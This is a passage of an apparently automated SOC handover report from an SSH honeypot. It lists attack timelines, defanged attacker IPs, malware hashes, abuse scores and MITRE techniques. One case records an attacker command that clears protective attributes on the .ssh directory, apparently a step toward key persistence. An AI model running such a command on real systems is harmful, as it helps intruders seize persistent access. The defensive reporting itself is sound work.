| `2026-04-27 16:36:28` | `cowrie.log.closed` |
| `2026-04-27 16:36:28` | `cowrie.session.params` |
| `2026-04-27 16:36:28` | `cowrie.command.input` |
| `2026-04-27 16:36:29` | `cowrie.log.closed` |
| `2026-04-27 16:36:29` | `cowrie.session.params` |
| `2026-04-27 16:36:29` | `cowrie.command.input` |
| `2026-04-27 16:36:29` | `cowrie.log.closed` |
| `2026-04-27 16:36:29` | `cowrie.session.params` |
| `2026-04-27 16:36:29` | `cowrie.command.input` |
| `2026-04-27 16:36:30` | `cowrie.log.closed` |
| `2026-04-27 16:36:30` | `cowrie.session.params` |
| `2026-04-27 16:36:30` | `cowrie.command.input` |
| `2026-04-27 16:36:30` | `cowrie.log.closed` |
| `2026-04-27 16:36:30` | `cowrie.session.params` |
| `2026-04-27 16:36:30` | `cowrie.command.input` |
| `2026-04-27 16:36:31` | `cowrie.log.closed` |
| `2026-04-27 16:36:31` | `cowrie.session.params` |
| `2026-04-27 16:36:31` | `cowrie.command.input` |
| `2026-04-27 16:36:31` | `cowrie.log.closed` |
| `2026-04-27 16:36:31` | `cowrie.session.params` |
| `2026-04-27 16:36:31` | `cowrie.command.input` |
| `2026-04-27 16:36:32` | `cowrie.log.closed` |
| `2026-04-27 16:36:32` | `cowrie.session.params` |
| `2026-04-27 16:36:32` | `cowrie.command.input` |
| `2026-04-27 16:36:32` | `cowrie.log.closed` |
| `2026-04-27 16:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.88[.]44` to AbuseIPDB if not already reported
- [ ] Block `106.75.88[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dabea8a7d26a

| Field | Detail |
|---|---|
| **Source IP** | `45.17.39[.]120` |
| **First Seen** | 2026-04-27 17:24 |
| **Last Seen** | 2026-04-27 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 17:24:35` | `cowrie.session.connect` |
| `2026-04-27 17:24:35` | `cowrie.client.version` |
| `2026-04-27 17:24:35` | `cowrie.client.kex` |
| `2026-04-27 17:24:37` | `cowrie.login.success` |
| `2026-04-27 17:24:37` | `cowrie.session.params` |
| `2026-04-27 17:24:37` | `cowrie.command.input` |
| `2026-04-27 17:24:37` | `cowrie.command.failed` |
| `2026-04-27 17:24:37` | `cowrie.log.closed` |
| `2026-04-27 17:24:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.17.39[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.17.39[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `106.75.88[.]44` | **21** | 2026-04-27 16:27 | 2026-04-27 16:50 | 38m | 0 | `T1592` | 🟠 MEDIUM |
| `177.148.47[.]187` | **16** | 2026-04-27 16:53 | 2026-04-27 17:05 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `101.245.100[.]75` | **2** | 2026-04-27 14:25 | 2026-04-27 14:27 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.96.199[.]69` | **2** | 2026-04-27 16:33 | 2026-04-27 16:35 | 4m | 0 | `T1592` | 🟢 LOW |
| `114.217.10[.]60` | **2** | 2026-04-27 16:30 | 2026-04-27 16:32 | 4m | 0 | `T1592` | 🟢 LOW |
| `124.228.34[.]69` | **2** | 2026-04-27 14:06 | 2026-04-27 14:08 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-04-27 15:47 | 2026-04-27 15:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.118.217[.]162` | **2** | 2026-04-27 15:15 | 2026-04-27 15:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.117.56[.]120` | 1 | 2026-04-27 14:32 | 2026-04-27 14:32 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.152.52[.]213` | 1 | 2026-04-27 15:28 | 2026-04-27 15:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.38.205[.]224` | 1 | 2026-04-27 16:07 | 2026-04-27 16:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.224.78[.]164` | 1 | 2026-04-27 16:26 | 2026-04-27 16:27 | 96s | 0 | `T1592` | 🟢 LOW |
| `121.29.4[.]80` | 1 | 2026-04-27 14:09 | 2026-04-27 14:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.114.8[.]57` | 1 | 2026-04-27 14:08 | 2026-04-27 14:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.63.196[.]175` | 1 | 2026-04-27 15:10 | 2026-04-27 15:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.6[.]138` | 1 | 2026-04-27 16:16 | 2026-04-27 16:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.206.32[.]4` | 1 | 2026-04-27 14:03 | 2026-04-27 14:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.147[.]226` | 1 | 2026-04-27 16:10 | 2026-04-27 16:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.44.12[.]249` | 1 | 2026-04-27 16:11 | 2026-04-27 16:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.241.179[.]235` | 1 | 2026-04-27 16:00 | 2026-04-27 16:00 | 2s | 0 | `T1592` | 🟢 LOW |
| `211.213.96[.]6` | 1 | 2026-04-27 15:37 | 2026-04-27 15:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.4.91[.]162` | 1 | 2026-04-27 16:13 | 2026-04-27 16:14 | 25s | 0 | `T1592` | 🟢 LOW |
| `37.143.61[.]165` | 1 | 2026-04-27 15:53 | 2026-04-27 15:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.160.244[.]79` | 1 | 2026-04-27 16:33 | 2026-04-27 16:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.239.114[.]251` | 1 | 2026-04-27 15:04 | 2026-04-27 15:04 | 30s | 0 | `T1592` | 🟢 LOW |
| `83.235.21[.]125` | 1 | 2026-04-27 15:23 | 2026-04-27 15:23 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `177.148.47[.]187` | BR | TIM S/A | **100** ⚠️ | 0 |
| `47.239.114[.]251` | HK | ALIBABA CLOUD - HK | **100** ⚠️ | 0 |
| `180.76.147[.]226` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 4 |
| `43.160.244[.]79` | SG | ACEVILLE PTE.LTD. | **100** ⚠️ | 0 |
| `182.44.12[.]249` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 3 |
| `165.154.6[.]138` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 11 |
| `124.228.34[.]69` | CN | CHINANET Hunan province network | **100** ⚠️ | 36 |
| `121.224.78[.]164` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `104.152.52[.]213` | US | Rethem Hosting LLC | **100** ⚠️ | 50 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 69 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 22 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (79 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 51 |
| AbuseIPDB score 23 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 167 cases |
| Tool 34  | Credential Extractor        | ✅ 37 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 79 filtered (47.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 34 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 21 priority case(s) shown individually · 26 recon entry/entries in table (8 group(s) consolidating 49 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-27T17:26:52Z_
